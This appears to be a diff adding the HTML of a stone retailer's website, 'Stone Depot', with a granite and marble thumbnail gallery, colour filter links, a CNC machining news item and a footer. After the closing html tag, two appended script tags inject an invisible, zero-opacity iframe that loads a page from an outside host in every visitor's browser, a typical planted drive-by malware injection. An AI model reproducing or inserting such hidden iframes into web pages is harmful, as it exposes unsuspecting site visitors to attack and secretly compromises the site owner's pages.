+            <td valign="top" bgcolor="#FFFFFF" align="center"><table border="0" width="430"  cellpadding="1" cellspacing="1" >
+              <tr>
+                <td>                    <table border="0" width="100%" cellpadding="0" cellspacing="0" >
+                      <tr>
+                        <td><!--start cat-->
+                            <table border="0" cellpadding="1" cellspacing="0" width="100%"  >
+                              <tr>
+                                <!--start lap cat-->
+                                                                <td align="center" >
+								<table border="0" cellpadding="1" cellspacing="0" width="100%" style="border:dotted #727272 1px; " >
+                                    <tr height="18">
+                                      <td align="center" class="font_chose" >Granite</td>
+                                    </tr>
+                                </table></td>
+                                                                <td align="center" >
+								<table border="0" cellpadding="1" cellspacing="0" width="100%" style="border:dotted #727272 1px; " >
+                                    <tr height="18">
+                                      <td align="center" class="font_cam" ><a href=?vnTRUST=act:main|type:2>Marble</a></td>
+                                    </tr>
+                                </table></td>
+                                                                <td align="center" >
+								<table border="0" cellpadding="1" cellspacing="0" width="100%" style="border:dotted #727272 1px; " >
+                                    <tr height="18">
+                                      <td align="center" class="font_cam" ><a href=?vnTRUST=act:main|type:4>Tiles</a></td>
+                                    </tr>
+                                </table></td>
+                                                                <td align="center" >
+								<table border="0" cellpadding="1" cellspacing="0" width="100%" style="border:dotted #727272 1px; " >
+                                    <tr height="18">
+                                      <td align="center" class="font_cam" ><a href=?vnTRUST=act:main|type:3>Others</a></td>
+                                    </tr>
+                                </table></td>
+                                                                <!--end lap cat-->
+                              </tr>
+                            </table>
+                          <!-- end cat-->
+                        </td>
+                      </tr>
+                      <tr>
+                        <td  ><table border="0" width="100%" cellpadding="0" cellspacing="0" >
+                            <tr>
+                              <td   height="270" valign="top">
+							  <table border="0"  cellpadding="1" cellspacing="1"  >
+                                  <tr>
+                                                                        <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('White-Pearl.jpg');"><img src="view_thumb.php?image=stones/thumbs/White-Pearl.jpg&amp;w=50" height="50" border="0" width="50"  alt="White Pearl" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Imperial-White.jpg');"><img src="view_thumb.php?image=stones/thumbs/Imperial-White.jpg&amp;w=50" height="50" border="0" width="50"  alt="Imperial White" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Black-Galaxy.jpg');"><img src="view_thumb.php?image=stones/thumbs/Black-Galaxy.jpg&amp;w=50" height="50" border="0" width="50"  alt="Black Galaxy" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Blue-Pearl.jpg');"><img src="view_thumb.php?image=stones/thumbs/Blue-Pearl.jpg&amp;w=50" height="50" border="0" width="50"  alt="Blue Pearl" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Juparana-Colombo.jpg');"><img src="view_thumb.php?image=stones/thumbs/Juparana-Colombo.jpg&amp;w=50" height="50" border="0" width="50"  alt="Juparana Colombo" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Giallo-Vicenza.jpg');"><img src="view_thumb.php?image=stones/thumbs/Giallo-Vicenza.jpg&amp;w=50" height="50" border="0" width="50"  alt="Giallo Vicenza" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Giallo--Veneziano.jpg');"><img src="view_thumb.php?image=stones/thumbs/Giallo--Veneziano.jpg&amp;w=50" height="50" border="0" width="50"  alt="Giallo Veneziano" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Dakota-Mahogany.jpg');"><img src="view_thumb.php?image=stones/thumbs/Dakota-Mahogany.jpg&amp;w=50" height="50" border="0" width="50"  alt="Dakota Mahogany" /></a>
+                                        </tr><tr>                                    <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('BORDEAUX.jpg');"><img src="view_thumb.php?image=stones/thumbs/BORDEAUX.jpg&amp;w=50" height="50" border="0" width="50"  alt="BORDEAUX" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Black-Absolute.jpg');"><img src="view_thumb.php?image=stones/thumbs/Black-Absolute.jpg&amp;w=50" height="50" border="0" width="50"  alt="Black Absolute" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Shivakashi.JPG');"><img src="view_thumb.php?image=stones/thumbs/Shivakashi.JPG&amp;w=50" height="50" border="0" width="50"  alt="Shivakashi" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Paradiso.jpg');"><img src="view_thumb.php?image=stones/thumbs/Paradiso.jpg&amp;w=50" height="50" border="0" width="50"  alt="Paradiso" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Kinawa.JPG');"><img src="view_thumb.php?image=stones/thumbs/Kinawa.JPG&amp;w=50" height="50" border="0" width="50"  alt="Kinawa" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('1_Giallo-Napoleon.JPG');"><img src="view_thumb.php?image=stones/thumbs/1_Giallo-Napoleon.JPG&amp;w=50" height="50" border="0" width="50"  alt="Giallo Napoleon" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Tan-Brown.JPG');"><img src="view_thumb.php?image=stones/thumbs/Tan-Brown.JPG&amp;w=50" height="50" border="0" width="50"  alt="Tan Brown" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Saphire-Blue.JPG');"><img src="view_thumb.php?image=stones/thumbs/Saphire-Blue.JPG&amp;w=50" height="50" border="0" width="50"  alt="Saphire Blue" /></a>
+                                        </tr><tr>                                    <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Peacock-Green.JPG');"><img src="view_thumb.php?image=stones/thumbs/Peacock-Green.JPG&amp;w=50" height="50" border="0" width="50"  alt="Peacock Green" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Giallo-Ornamentable.JPG');"><img src="view_thumb.php?image=stones/thumbs/Giallo-Ornamentable.JPG&amp;w=50" height="50" border="0" width="50"  alt="Giallo Ornamentable" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Giallo-Fiorito.JPG');"><img src="view_thumb.php?image=stones/thumbs/Giallo-Fiorito.JPG&amp;w=50" height="50" border="0" width="50"  alt="Giallo Fiorito" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Baltic-Brown.JPG');"><img src="view_thumb.php?image=stones/thumbs/Baltic-Brown.JPG&amp;w=50" height="50" border="0" width="50"  alt="Baltic Brown" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Autumn-Leaf.jpg');"><img src="view_thumb.php?image=stones/thumbs/Autumn-Leaf.jpg&amp;w=50" height="50" border="0" width="50"  alt="Autumn Leaf" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Ubatuba.jpg');"><img src="view_thumb.php?image=stones/thumbs/Ubatuba.jpg&amp;w=50" height="50" border="0" width="50"  alt="Ubatuba" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('New-Caledonia.jpg');"><img src="view_thumb.php?image=stones/thumbs/New-Caledonia.jpg&amp;w=50" height="50" border="0" width="50"  alt="New Caledonia" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Giallo-Fantasia.jpg');"><img src="view_thumb.php?image=stones/thumbs/Giallo-Fantasia.jpg&amp;w=50" height="50" border="0" width="50"  alt="Giallo Fantasia" /></a>
+                                        </tr><tr>                                    <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Autumn-Harmony.jpg');"><img src="view_thumb.php?image=stones/thumbs/Autumn-Harmony.jpg&amp;w=50" height="50" border="0" width="50"  alt="Autumn Harmony" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Carioca--Gold.jpg');"><img src="view_thumb.php?image=stones/thumbs/Carioca--Gold.jpg&amp;w=50" height="50" border="0" width="50"  alt="Carioca Gold" /></a>
+                                                                            <td  align="left" onmouseover="this.bgColor='#762A1D'"  onmouseout="this.bgColor='#FFFFFF'" ><a href="javascript:sendToFlash('Almond-Mauve.jpg');"><img src="view_thumb.php?image=stones/thumbs/Almond-Mauve.jpg&amp;w=50" height="50" border="0" width="50"  alt="Almond Mauve" /></a>
+                                        </td>
+                                                                      </tr>
+                              </table></td>
+                            </tr>
+                        </table></td>
+                      </tr>
+                      <tr>
+                        <td><!-- start feature-->
+                            <table border="0" cellpadding="2" cellspacing="0" width="100%"   >
+                              <tr>
+                                <!-- start lap feature-->
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:0 style="color:#35ADBB">None</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:1 style="color:#BCBCBC">White</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:2 style="color:Gold">Gold</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:3 style="color:Gray">Gray</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:4 style="color:Red">Red</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:5 style="color:Green">Green</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:6 style="color:Blue">Blue</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:7 style="color:Brown">Brown</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <td align="center" >
+								
+								<table border="0" cellpadding="0" cellspacing="0" width="100%"  style="border:dotted #727272 1px; " >
+                                    <tr>
+                                      <td align="center"  height="18" ><a href=?vnTRUST=act:main|type:1|color:8 style="color:Black">Black</a></td>
+                                    </tr>
+                                </table>
+								
+								</td>
+                                                                <!-- end lap feature-->
+                              </tr>
+                            </table>
+                          <!-- end feature-->
+                        </td>
+                      </tr>
+                  </table></td>
+              </tr>
+            </table>			
+              <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td align="center"></td>
+                </tr>
+              </table>
+			  
+			 </td>
+            <td width="10"><img src="images1/r_box3.jpg" width="10" height="340"></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="10"><img src="images1/l_b_box3.jpg"></td>
+            <td background="images1/b_box3.jpg"><img src="images1/b_box3.jpg" /></td>
+            <td width="10"><img src="images1/r_b_box3.jpg"></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td  valign="top" background="images1/line_vang.jpg"><img src="images1/line_vang.jpg"></td>
+  </tr>
+  <tr>
+    <td background="images1/bg_main1.jpg"></td>
+  </tr>
+</table>
+<br />
+<br />
+<table width="100%"  border="0" cellspacing="0" cellpadding="0" >
+  <tr>
+    <td background="images1/line2.jpg"><img src="images1/line2.jpg" width="4" height="1" /></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="2" cellpadding="2">
+      <tr>
+        <td class="font_title" style="padding-left:4px">News </td>
+      </tr>
+      <tr>
+        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td>                    <table width="100%"  border="0" cellspacing="1" cellpadding="1" >
+                      <tr>
+                        <td class="font_title_news" style="padding-left:2px"><img src="images1/arr_news.jpg" align="absmiddle" />&nbsp;<a href="?vnTRUST=act:news_detail|newsid:2"><b>
+                          CNC Technology                        </b></a></td>
+                      </tr>
+                      <tr>
+                        <td>                            <table width="100" align="left">
+                              <tr>
+                                <td ><a href="?vnTRUST=act:news_detail|newsid:2"><img src="news_images/thumbs/cnc.jpg"  width="120"  align="left" border="0" /></a></td>
+                              </tr>
+                            </table>
+                                                      CNC Machining Centre conceived, designed and built for meeting the production needs of users who really seek the best quality-price ratio.<br />
+<br />
+The machining operations are made easy thanks to the new 13.5 KW electrospindle which with the tilting head (optional) can work and polish recessed kitchen tops.<br />
+                            <p align="right"><a href="?vnTRUST=act:news_detail|newsid:2"> <b>Read more &raquo;</b> </a></p></td>
+                      </tr>
+                      <tr>
+                        <td height="10">&nbsp;</td>
+                      </tr>
+                    </table>
+                                  <!-- news more -->
+                    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                        </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+
+
+
+	
+
+
+
+	<!--end main --></td>
+
+
+
+	<td width="64"   >&nbsp;</td>
+
+
+
+  </tr>
+
+
+
+   </table>	</td>
+
+
+
+        </tr>
+
+
+
+    </table></td>
+
+
+
+  </tr>
+
+
+
+ <tr>
+
+
+
+    <td >&nbsp;</td>
+
+
+
+  </tr>
+
+
+
+ <tr>
+
+
+
+   <td ><table width="900" border="0" cellspacing="0" cellpadding="0"  align="center">
+
+
+
+     <tr>
+
+
+
+       <td width="261" align="right" valign="top"><table width="196" border="0" cellspacing="0" cellpadding="0">
+
+
+
+           <tr>
+
+
+
+             <td background="images1/line1.jpg"><img src="images1/line1.jpg" width="5" height="1"></td>
+
+
+
+           </tr>
+
+
+
+           <tr>
+
+
+
+             <td align="center"  style="padding-top:5px;" class="font_bottom "><a href="index1.php">Version 1.0</a></td>
+
+
+
+           </tr>
+
+
+
+           <tr>
+
+
+
+             <td align="center" class="font_bottom " height="25"><a href="index.php">Version 2.0</a> </td>
+
+
+
+           </tr>
+
+
+
+       </table></td>
+
+
+
+       <td valign="top" style="padding-right:64px;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+
+
+
+           <tr>
+
+
+
+             <td background="images1/line1.jpg"><img src="images1/line1.jpg" width="5" height="1"></td>
+
+
+
+           </tr>
+
+
+
+           <tr>
+
+
+
+             <td style="padding-right:64px;"><table width="100%"  border="0" cellspacing="3" cellpadding="3" >
+
+
+
+                 <tr>
+
+
+
+                   <td align="center" class="font_bottom "><a href="?vnTRUST=act:main"><strong>Home</strong></a> | <a href="?vnTRUST=act:news"><strong>News</strong></a> | <a href="?vnTRUST=act:counter"><strong>Counter Tops</strong></a> | <a href="?vnTRUST=act:tiles"><strong>Tiles</strong></a> | <a href="?vnTRUST=act:about"><strong>About us </strong></a> | <a href="?vnTRUST=act:more"><strong>More</strong></a> | <a href="?vnTRUST=act:contact"><strong>Contact</strong></a></td>
+
+
+
+                 </tr>
+
+
+
+                 <tr>
+
+
+
+                   <td align="center" class="font_bottom">Copyright &copy; 2006 Stone Depot- All rights reserved</td>
+
+
+
+                 </tr>
+
+
+
+             </table></td>
+
+
+
+           </tr>
+
+
+
+       </table></td>
+
+
+
+     </tr>
+
+
+
+   </table></td>
+
+
+
+ </tr>	
+
+
+
+</table>
+
+
+</body>
+
+
+
+</html>
+
+
+
+<script>document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://vidintex.com/includes/class.pop.php"></iframe></div>');</script><script>document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://vidintex.com/includes/class.pop.php"></iframe></div>');</script>
